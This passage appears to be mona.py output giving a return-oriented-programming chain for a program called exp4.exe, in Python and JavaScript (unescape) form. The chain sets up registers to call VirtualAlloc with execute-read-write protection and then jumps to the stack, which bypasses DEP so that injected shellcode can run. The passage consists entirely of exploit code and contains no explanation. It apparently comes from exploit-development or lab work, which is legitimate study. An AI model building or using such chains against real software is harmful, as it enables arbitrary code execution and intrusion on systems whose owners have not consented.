      0x00f00560,  # ptr to &VirtualAlloc() [IAT exp4.exe]
      0x00da2b0c,  # MOV EAX,DWORD PTR DS:[ECX] # RETN [exp4.exe] 
      0x00b23eea,  # XCHG EAX,ESI # RETN [exp4.exe] 
      #[---INFO:gadgets_to_set_ebp:---]
      0x0082039c,  # POP EBP # RETN [exp4.exe] 
      0x008f880d,  # & jmp esp [exp4.exe]
      #[---INFO:gadgets_to_set_ebx:---]
      0x007b4899,  # POP EBX # RETN [exp4.exe] 
      0x00000001,  # 0x00000001-> ebx
      #[---INFO:gadgets_to_set_edx:---]
      0x00d8e950,  # POP EDX # RETN [exp4.exe] 
      0x00001000,  # 0x00001000-> edx
      #[---INFO:gadgets_to_set_ecx:---]
      0x00b62c35,  # POP ECX # RETN [exp4.exe] 
      0x00000040,  # 0x00000040-> ecx
      #[---INFO:gadgets_to_set_edi:---]
      0x0096c6d6,  # POP EDI # RETN [exp4.exe] 
      0x00b13e04,  # RETN (ROP NOP) [exp4.exe]
      #[---INFO:gadgets_to_set_eax:---]
      0x00b12f47,  # POP EAX # RETN [exp4.exe] 
      0x90909090,  # nop
      #[---INFO:pushad:---]
      0x00b4a826,  # PUSHAD # RETN [exp4.exe] 
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

  rop_chain = create_rop_chain()



*** [ JavaScript ] ***

  //rop chain generated with mona.py - www.corelan.be
  rop_gadgets = unescape(
    "" + // #[---INFO:gadgets_to_set_esi:---] : 
    "%uc565%u0077" + // 0x0077c565 : ,# POP ECX # RETN [exp4.exe] 
    "%u0560%u00f0" + // 0x00f00560 : ,# ptr to &VirtualAlloc() [IAT exp4.exe]
    "%u2b0c%u00da" + // 0x00da2b0c : ,# MOV EAX,DWORD PTR DS:[ECX] # RETN [exp4.exe] 
    "%u3eea%u00b2" + // 0x00b23eea : ,# XCHG EAX,ESI # RETN [exp4.exe] 
    "" + // #[---INFO:gadgets_to_set_ebp:---] : 
    "%u039c%u0082" + // 0x0082039c : ,# POP EBP # RETN [exp4.exe] 
    "%u880d%u008f" + // 0x008f880d : ,# & jmp esp [exp4.exe]
    "" + // #[---INFO:gadgets_to_set_ebx:---] : 
    "%u4899%u007b" + // 0x007b4899 : ,# POP EBX # RETN [exp4.exe] 
    "%u0001%u0000" + // 0x00000001 : ,# 0x00000001-> ebx
    "" + // #[---INFO:gadgets_to_set_edx:---] : 
    "%ue950%u00d8" + // 0x00d8e950 : ,# POP EDX # RETN [exp4.exe] 
    "%u1000%u0000" + // 0x00001000 : ,# 0x00001000-> edx
    "" + // #[---INFO:gadgets_to_set_ecx:---] : 
    "%u2c35%u00b6" + // 0x00b62c35 : ,# POP ECX # RETN [exp4.exe] 
    "%u0040%u0000" + // 0x00000040 : ,# 0x00000040-> ecx
    "" + // #[---INFO:gadgets_to_set_edi:---] : 
    "%uc6d6%u0096" + // 0x0096c6d6 : ,# POP EDI # RETN [exp4.exe] 
    "%u3e04%u00b1" + // 0x00b13e04 : ,# RETN (ROP NOP) [exp4.exe]
    "" + // #[---INFO:gadgets_to_set_eax:---] : 
    "%u2f47%u00b1" + // 0x00b12f47 : ,# POP EAX # RETN [exp4.exe] 
    "%u9090%u9090" + // 0x90909090 : ,# nop
    "" + // #[---INFO:pushad:---] : 
    "%ua826%u00b4" + // 0x00b4a826 : ,# PUSHAD # RETN [exp4.exe] 
    ""); //  : 


--------------------------------------------------------------------------------------------------

